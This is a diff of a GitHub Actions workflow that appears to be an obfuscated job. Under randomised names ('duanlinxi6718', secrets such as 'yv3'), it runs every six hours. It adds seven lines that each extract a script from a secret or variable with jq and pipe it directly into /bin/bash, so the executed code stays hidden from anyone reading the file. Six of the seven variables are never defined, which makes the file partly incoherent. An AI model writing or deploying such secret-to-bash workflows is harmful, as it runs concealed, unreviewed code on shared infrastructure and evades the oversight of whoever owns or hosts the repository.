@@ -1,21 +1,22 @@
 name: duanlinxi6718
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '5 2/6 * * *'
-
-jobs:  # 26960
+    - cron: '11 5/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: duanlinxi6718
         env:
-          epimy126: ${{ secrets.epimy126 }}
+          yv3: ${{ secrets.yv3 }}
         run: |
-          echo $epimy126 | jq -r .bkpp37031 | /bin/bash
-          echo $ufzed7 | jq -r .togh2 | /bin/bash
-          echo $gw194 | jq -r .pfm80265 | /bin/bash
-          echo $gyqam5367 | jq -r .tnagp32880 | /bin/bash
+          echo $yv3 | jq -r .jq649 | /bin/bash
+          echo $dfx050 | jq -r .u98059 | /bin/bash
+          echo $y60 | jq -r .xu445 | /bin/bash
+          echo $i836 | jq -r .v38 | /bin/bash
+          echo $raxbc32924 | jq -r .vyhc5211 | /bin/bash
+          echo $hu3 | jq -r .apkp78 | /bin/bash
+          echo $huc0 | jq -r .cc15803 | /bin/bash
 
